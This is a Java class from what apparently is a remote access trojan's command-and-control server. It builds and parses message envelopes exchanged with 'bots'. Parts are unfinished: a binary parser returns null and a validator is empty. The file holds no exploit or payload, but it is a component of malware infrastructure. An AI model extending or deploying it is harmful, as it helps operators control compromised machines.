package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import devs.alex.sah.rat.c2server.utils.Utils;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;

import java.nio.ByteBuffer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class MessagesBuilderImpl implements MessagesBuilder {

    private final MessagesConfiguration mConfig;
    public MessagesBuilderImpl(MessagesConfiguration mConfig) {
        this.mConfig = mConfig;
    }

    private String section(String key, String value){
        return mConfig.delimiters.section + key + mConfig.delimiters.value + value;
    }


    @Override
    public String generateBotEnvelope(String packageType, String module, String request, String RequiredResponse){
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, packageType) +
                        section(mConfig.keys.targetModule, module) +
                        section(mConfig.keys.requestID, request) +
                        section(mConfig.keys.responseType, RequiredResponse));
    }

    @Override
    public String generateBotEnvelope(String packageType, String module, String request){
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, packageType) +
                        section(mConfig.keys.targetModule, module) +
                        section(mConfig.keys.requestID, request));
    }

    @Override
    public void validateBotEnvelope(Message<?> message, StringBuffer errors) {
    }

    @Override
    public String generateUserEnvelope(String packageType, String module, String userId, String RequiredResponse){  // FIXME
        return Utils.lengthCheck(":PT:"+packageType+ "#M:"+ module + "#UID:" + userId +"#RPT:"+RequiredResponse);
    }

    @Override
    public String generateUserEnvelope(String packageType, String module, String userId){ // FIXME
        return Utils.lengthCheck(":PT:"+packageType+ "#M:"+ module + "#UID:" + userId);
    }

    @Override
    public Message<String> parseMessage(TextMessage message, StringBuffer errors){
        try {
            int pos = message.getPayload().indexOf(mConfig.delimiters.section);
            int envelopeSize = Integer.parseInt(message.getPayload().substring(0, pos));

            String envelope = message.getPayload().substring(pos + 1, envelopeSize);

            Message<String> parsedMessage = new Message<>(message.getPayload().substring(envelopeSize));
            parseEnvelope(parsedMessage, envelope, errors);

            return parsedMessage;

        } catch (RuntimeException exception){
            errors.append("Failed to extract envelope");
            return null;
        }
    }

    @Override
    public Message<ByteBuffer> parseMessage(BinaryMessage message, StringBuffer errors){
        short envelopeSize = ByteBuffer.wrap(new byte[]{message.getPayload().array()[0], message.getPayload().array()[1]}).getShort();
        //short envelopeSize = (short) (b1<<8 | b2);
        return null;
    }

    @Override
    public String generateErrorEnvelope(String targetType) {
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, mConfig.packages.singleMessage) +
                section(mConfig.keys.targetModule, "error") +
                section(mConfig.keys.targetType, mConfig.targets.serverSide));
    }


    private void parseEnvelope(Message<?> message, String envelope, StringBuffer errors){
        String[] sections = envelope.split( mConfig.delimiters.section);
        Pattern pattern = Pattern.compile( mConfig.delimiters.value);

        for (String section: sections) { // TODO test
            Matcher matcher = pattern.matcher(section);
            if (matcher.find()) {
                String key = section.substring(0, matcher.start());
                String value = section.substring(matcher.end());

                if (key.equals(mConfig.keys.isLast)) {
                    message.setIsLast(value);
                } else if(key.equals(mConfig.keys.packageType)){
                    message.setPackageType(value);
                }else if(key.equals(mConfig.keys.targetModule)){
                    message.setTargetModule(value);
                }else if(key.equals(mConfig.keys.targetID)){
                    message.setTargetID(value);
                }else if(key.equals(mConfig.keys.targetType)){
                    message.setTargetType(value);
                }else if(key.equals(mConfig.keys.fullMessageSize)){
                    message.setFullMessageSize(value);
                }else if(key.equals(mConfig.keys.requestID)){
                    message.setRequestID(value);
                }else if(key.equals(mConfig.keys.responseType)){
                    message.setResponseType(value);
                } else{
                    errors.append("Undefined key [").append(key).append("] value [").append(value).append("]\n");
                }
            } else {
                errors.append("Failed to read section: ").append(section).append(";\n");
            }
        }
    }

    private void nullCheckBasic(Message<?> message, StringBuffer errors){
        if(message.getPackageType() == null){
            errors.append("PackageType cannot be null\n");
        }
        if (message.getTargetType() == null) {
            errors.append("TargetType cannot be null\n");
        }
        if(message.getPackageType() == null){
            errors.append("PackageType cannot be null\n");
        }
    }


}
